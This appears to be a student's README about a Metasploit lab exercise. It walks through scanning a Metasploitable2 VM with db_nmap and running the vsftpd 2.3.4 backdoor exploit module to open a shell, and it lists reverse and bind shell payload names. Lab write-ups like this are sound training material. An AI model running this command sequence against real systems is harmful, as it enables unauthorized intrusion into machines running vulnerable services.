# 🎯 Metasploit Framework - Vulnerability Scanning & Exploitation

## 🧠 What I Learned

In this exercise, I explored the **Metasploit Framework**, a powerful tool used for **vulnerability assessment, payload generation, and exploitation**. I learned how to perform Nmap scans from inside Metasploit, search for vulnerable services, configure modules, and successfully launch an exploit against a known vulnerable target (Metasploitable2).

## 📚 Topics Covered

- Launching and navigating Metasploit (`msfconsole`)
- Performing port scans within Metasploit (`db_nmap`)
- Searching and selecting exploit modules
- Setting up payloads (reverse shells, bind shells)
- Configuring exploit options (RHOST, LHOST, LPORT, etc.)
- Gaining a session and interacting with a compromised machine
- Basic post-exploitation with Meterpreter

## 🛠️ Tools & Environment

- **Kali Linux** (Attacker VM)
- **Metasploit Framework**
- **Metasploitable2** (Target VM)
- Nmap (integrated with Metasploit using `db_nmap`)

## 🔍 Workflow Example

### 1. Start Metasploit Console
  msfconsole
### 2. Scan Target with Nmap from within Metasploit
  - db_nmap 192.168.56.101
### 3. Search for a Vulnerable Service
  - search vsftpd 2.3.4
### 4. Configure Exploit Module
  - use exploit/unix/ftp/vsftpd_234_backdoor
  - set RHOST 192.168.56.101
### 5. Run the Exploit
  run/exploit
### 🎉 Successful: Shell session opened.

🧪 Payload Concepts
Payloads are the actual code that gets executed on the target

Common types:
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp
Used set PAYLOAD and set LHOST/LPORT to customize
